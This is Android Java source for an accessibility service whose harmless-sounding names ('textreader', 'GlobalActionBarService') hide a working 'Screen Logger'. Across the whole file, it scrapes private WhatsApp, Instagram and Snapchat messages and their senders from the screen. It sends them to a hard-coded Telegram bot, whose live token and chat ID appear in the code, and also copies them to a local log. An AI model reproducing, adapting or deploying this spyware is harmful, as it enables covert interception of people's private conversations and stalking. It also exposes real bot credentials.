package com.example.textreader;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

public class GlobalActionBarService extends AccessibilityService {

    private SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    // 🔥 YOUR TELEGRAM CREDENTIALS
    private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
    private static final String CHAT_ID = "5465116744";

    // DEBUG MODE – set to true to see every event
    private static final boolean DEBUG_MODE = true;

    private long lastSendTime = 0;
    private String lastSentHash = "";

    // ---- Inner class for message entry ----
    private static class MessageEntry {
        String sender;
        String text;
        MessageEntry(String sender, String text) {
            this.sender = sender;
            this.text = text;
        }
    }

    // Message text view IDs
    private Set<String> messageTextIds = new HashSet<String>() {{
        add("com.whatsapp:id/message_text");
        add("com.instagram.android:id/row_message_text");
        add("com.instagram.android:id/comment_text");
        add("com.instagram.android:id/direct_message_text");
        add("com.snapchat.android:id/chat_message_text");
    }};

    // Instagram DM header IDs
    private Set<String> dmHeaderIds = new HashSet<String>() {{
        add("com.instagram.android:id/direct_message_recipient_name");
        add("com.instagram.android:id/action_bar_title");
        add("com.instagram.android:id/row_user_name");
    }};

    // Instagram sender name IDs
    private Set<String> instagramSenderIds = new HashSet<String>() {{
        add("com.instagram.android:id/row_user_name");
        add("com.instagram.android:id/comment_user_name");
        add("com.instagram.android:id/username_text_view");
    }};

    // WhatsApp container IDs
    private Set<String> whatsappContainerIds = new HashSet<String>() {{
        add("com.whatsapp:id/outgoing_message_container");
        add("com.whatsapp:id/incoming_message_container");
    }};

    // Blacklist
    private Set<String> uiJunk = new HashSet<String>() {{
        add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
        add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
        add("Search"); add("Type a message"); add("New message"); add("Seen");
        add("Delivered"); add("Read"); add("Like"); add("Comment"); add("Share");
        add("Save"); add("Cancel"); add("Done"); add("Edit"); add("Post");
        add("Story"); add("Home"); add("Explore"); add("Activity");
        add("Notifications"); add("Direct"); add("Inbox"); add("Create");
        add("View"); add("Reply"); add("Forward"); add("Delete");
        add("Options"); add("Menu"); add("Add"); add("Remove"); add("Block");
        add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
        add("Active now"); add("Typing..."); add("Today"); add("Yesterday");
        add("Seen by"); add("Delivered to"); add("Read by");
        add("Message"); add("Chat"); add("Group"); add("Broadcast");
        add("View Profile"); add("View Story"); add("Reply to");
        add("Manage"); add("Clear all"); add("Location off");
        add("Self Aware"); add("Inspo needed...");
        add("GB"); add("MB"); add("used"); add("airtel"); add("Screenlogger");
        add("Telegram"); add("Search or ask Meta AI");
        add("The Wild Theme"); add("Janam Janam"); add("Sai Abhyankkar");
        add("Dhanush"); add("Pritam"); add("Arijit Singh"); add("Antara Mitra");
        add("Aber sie"); add("Requests"); add("BHAI LOG 💓🫂");
        add("Bakchodi boiz"); add("MARK AS READ");
        add("Display brightness");
        add("Unpopular opinion");
        add("Explore");
        add("Reels");
    }};

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        sendToTelegram("✅ Screen Logger service started successfully!");
        writeToFile("Service started at " + dateFormat.format(new Date()));
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();

        // Only target apps
        if (!pkg.equals("com.instagram.android") &&
            !pkg.equals("com.snapchat.android") &&
            !pkg.equals("com.whatsapp")) {
            return;
        }

        // For debugging: send event details
        if (DEBUG_MODE) {
            String debugMsg = String.format("🔍 EVENT: %s | Type: %d", pkg, event.getEventType());
            sendToTelegram(debugMsg);
            writeToFile(debugMsg);
        }

        // Only process window changes (new screen) or content changes (new messages)
        if (event.getEventType() != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            event.getEventType() != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return;
        }

        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) {
            if (DEBUG_MODE) sendToTelegram("❌ root is null");
            return;
        }

        // --- For Instagram: check if DM screen ---
        if (pkg.equals("com.instagram.android")) {
            boolean isDM = isDMScreen(root);
            if (DEBUG_MODE) {
                sendToTelegram("📌 DM detection: " + (isDM ? "YES" : "NO"));
            }
            // We'll still try to extract messages even if not DM – to see what's there.
        }

        // 1. Get contact name (if any)
        String contact = findChatContact(root, pkg);

        // 2. Extract messages
        List<MessageEntry> messages = extractMessages(root, pkg);

        if (DEBUG_MODE) {
            sendToTelegram("📩 Found " + messages.size() + " messages");
            if (!messages.isEmpty()) {
                for (MessageEntry m : messages) {
                    sendToTelegram("  - " + m.sender + ": " + m.text);
                }
            }
        }

        if (messages.isEmpty()) {
            return;
        }

        // 3. Build output
        StringBuilder logBuilder = new StringBuilder();
        logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
        if (contact != null && !contact.isEmpty()) {
            logBuilder.append("👤 Chat with: ").append(contact).append("\n");
        }
        logBuilder.append("─────────────────────\n");
        for (MessageEntry msg : messages) {
            logBuilder.append("  ").append(msg.sender).append(": ").append(msg.text).append("\n");
        }

        String fullLog = logBuilder.toString().trim();
        if (fullLog.length() < 30) return;

        // Dedup & cooldown
        String hash = Integer.toHexString(fullLog.hashCode());
        long now = System.currentTimeMillis();
        if (hash.equals(lastSentHash) || (now - lastSendTime) < 5000) {
            return;
        }
        lastSentHash = hash;
        lastSendTime = now;

        sendToTelegram(fullLog);
        writeToFile(fullLog);
    }

    // ---- DM Screen Detection ----

    private boolean isDMScreen(AccessibilityNodeInfo root) {
        for (String id : dmHeaderIds) {
            if (findViewByViewId(root, id) != null) {
                return true;
            }
        }
        return false;
    }

    // ---- Helper methods ----

    private AccessibilityNodeInfo findViewByViewId(AccessibilityNodeInfo node, String targetId) {
        if (node == null) return null;
        if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(targetId)) {
            return node;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findViewByViewId(child, targetId);
                if (result != null) return result;
            }
        }
        return null;
    }

    private String findTextByViewId(AccessibilityNodeInfo node, String targetId) {
        AccessibilityNodeInfo view = findViewByViewId(node, targetId);
        if (view != null && view.getText() != null) {
            return view.getText().toString().trim();
        }
        return null;
    }

    private String findChatContact(AccessibilityNodeInfo root, String pkg) {
        Set<String> headerIds;
        if (pkg.equals("com.whatsapp")) {
            headerIds = new HashSet<String>() {{
                add("com.whatsapp:id/contact_name");
                add("com.whatsapp:id/conversation_contact_name");
            }};
        } else if (pkg.equals("com.instagram.android")) {
            headerIds = dmHeaderIds;
        } else {
            headerIds = new HashSet<>();
        }
        for (String id : headerIds) {
            String name = findTextByViewId(root, id);
            if (name != null && !name.isEmpty()) return name;
        }
        return findTopLargeText(root);
    }

    private String findTopLargeText(AccessibilityNodeInfo root) {
        List<String> candidates = new ArrayList<>();
        collectTopText(root, candidates, 0);
        for (String text : candidates) {
            text = text.trim();
            if (text.length() > 2 && text.length() < 30 && !uiJunk.contains(text) && !text.matches(".*\\d.*")) {
                return text;
            }
        }
        return null;
    }

    private void collectTopText(AccessibilityNodeInfo node, List<String> list, int depth) {
        if (node == null || depth > 4) return;
        if (node.getText() != null) {
            String text = node.getText().toString().trim();
            if (!text.isEmpty()) list.add(text);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectTopText(child, list, depth + 1);
        }
    }

    // ---- Message extraction ----

    private List<MessageEntry> extractMessages(AccessibilityNodeInfo root, String pkg) {
        List<MessageEntry> entries = new ArrayList<>();

        if (pkg.equals("com.whatsapp")) {
            List<AccessibilityNodeInfo> containers = findContainersByViewId(root, whatsappContainerIds);
            for (AccessibilityNodeInfo container : containers) {
                String viewId = container.getViewIdResourceName();
                boolean isOutgoing = viewId != null && viewId.contains("outgoing");
                String msg = extractTextFromNode(container);
                if (msg == null || msg.isEmpty()) continue;
                msg = cleanMessage(msg);
                if (msg.isEmpty()) continue;
                String sender = isOutgoing ? "You" : (findChatContact(root, pkg) != null ? findChatContact(root, pkg) : "Unknown");
                entries.add(new MessageEntry(sender, msg));
            }
        } else if (pkg.equals("com.instagram.android")) {
            List<AccessibilityNodeInfo> msgNodes = findAllTextNodes(root, messageTextIds);
            for (AccessibilityNodeInfo node : msgNodes) {
                String msg = node.getText() != null ? node.getText().toString().trim() : "";
                if (msg.isEmpty()) continue;
                msg = cleanMessage(msg);
                if (msg.isEmpty()) continue;

                // Determine sender
                boolean hasSender = false;
                AccessibilityNodeInfo parent = node.getParent();
                while (parent != null) {
                    if (hasSenderNameInTree(parent)) {
                        hasSender = true;
                        break;
                    }
                    parent = parent.getParent();
                }

                String sender;
                if (hasSender) {
                    String name = findSenderNameInTree(node);
                    if (name == null || name.isEmpty()) {
                        name = findChatContact(root, pkg);
                    }
                    sender = (name != null && !name.isEmpty()) ? name : "Unknown";
                } else {
                    sender = "You";
                }
                entries.add(new MessageEntry(sender, msg));
            }
        } else {
            // Snapchat
            List<String> texts = findAllTexts(root);
            for (String msg : texts) {
                msg = cleanMessage(msg);
                if (!msg.isEmpty()) {
                    entries.add(new MessageEntry("Unknown", msg));
                }
            }
        }
        return entries;
    }

    // ---- Instagram utilities ----

    private boolean hasSenderNameInTree(AccessibilityNodeInfo node) {
        if (node == null) return false;
        if (node.getViewIdResourceName() != null) {
            for (String id : instagramSenderIds) {
                if (node.getViewIdResourceName().equals(id)) {
                    return true;
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null && hasSenderNameInTree(child)) return true;
        }
        return false;
    }

    private String findSenderNameInTree(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.getViewIdResourceName() != null) {
            for (String id : instagramSenderIds) {
                if (node.getViewIdResourceName().equals(id)) {
                    if (node.getText() != null) return node.getText().toString().trim();
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                String found = findSenderNameInTree(child);
                if (found != null) return found;
            }
        }
        return null;
    }

    // ---- Generic helpers ----

    private List<AccessibilityNodeInfo> findContainersByViewId(AccessibilityNodeInfo root, Set<String> ids) {
        List<AccessibilityNodeInfo> results = new ArrayList<>();
        traverseContainers(root, results, ids);
        return results;
    }

    private void traverseContainers(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list, Set<String> ids) {
        if (node == null) return;
        if (node.getViewIdResourceName() != null) {
            for (String id : ids) {
                if (node.getViewIdResourceName().equals(id)) {
                    list.add(node);
                    return;
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) traverseContainers(child, list, ids);
        }
    }

    private List<AccessibilityNodeInfo> findAllTextNodes(AccessibilityNodeInfo root, Set<String> ids) {
        List<AccessibilityNodeInfo> results = new ArrayList<>();
        traverseTextNodes(root, results, ids);
        return results;
    }

    private void traverseTextNodes(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> list, Set<String> ids) {
        if (node == null) return;
        if (node.getViewIdResourceName() != null) {
            for (String id : ids) {
                if (node.getViewIdResourceName().equals(id)) {
                    list.add(node);
                    return;
                }
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) traverseTextNodes(child, list, ids);
        }
    }

    private String extractTextFromNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        StringBuilder sb = new StringBuilder();
        collectAllText(node, sb);
        return sb.toString();
    }

    private void collectAllText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString().trim();
            if (!text.isEmpty()) {
                if (sb.length() > 0) sb.append(" ");
                sb.append(text);
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectAllText(child, sb);
        }
    }

    private List<String> findAllTexts(AccessibilityNodeInfo root) {
        List<String> list = new ArrayList<>();
        collectTexts(root, list);
        return list;
    }

    private void collectTexts(AccessibilityNodeInfo node, List<String> list) {
        if (node == null) return;
        if (node.getText() != null) {
            String text = node.getText().toString().trim();
            if (!text.isEmpty()) list.add(text);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) collectTexts(child, list);
        }
    }

    private String cleanMessage(String msg) {
        msg = msg.trim();
        for (String junk : uiJunk) {
            if (msg.toLowerCase().contains(junk.toLowerCase())) return "";
        }
        if (msg.matches(".*\\d{1,2}:\\d{2}.*")) return "";
        if (msg.matches(".*(AM|PM).*")) return "";
        if (msg.matches(".*\\d+[mh] .*")) return "";
        if (!msg.matches(".*[a-zA-Z].*")) return "";
        if (msg.length() < 3) return "";
        if (msg.equals(msg.toUpperCase()) && msg.length() < 8) return "";
        return msg;
    }

    private String getAppName(String pkg) {
        if (pkg.equals("com.instagram.android")) return "INSTAGRAM";
        if (pkg.equals("com.snapchat.android")) return "SNAPCHAT";
        if (pkg.equals("com.whatsapp")) return "WHATSAPP";
        return pkg;
    }

    // ---- Telegram and file logging ----

    private void sendToTelegram(final String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                        "/sendMessage?chat_id=" + CHAT_ID +
                        "&text=" + URLEncoder.encode(message, "UTF-8");
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                writeToFile("Telegram error: " + e.toString());
            }
        }).start();
    }

    private void writeToFile(String text) {
        try {
            File logFile = new File(getFilesDir(), "debug_log.txt");
            FileOutputStream fos = new FileOutputStream(logFile, true);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            writer.write(text + "\n");
            writer.flush();
            writer.close();
        } catch (Exception e) { /* ignore */ }
    }

    @Override
    public void onInterrupt() {}
}
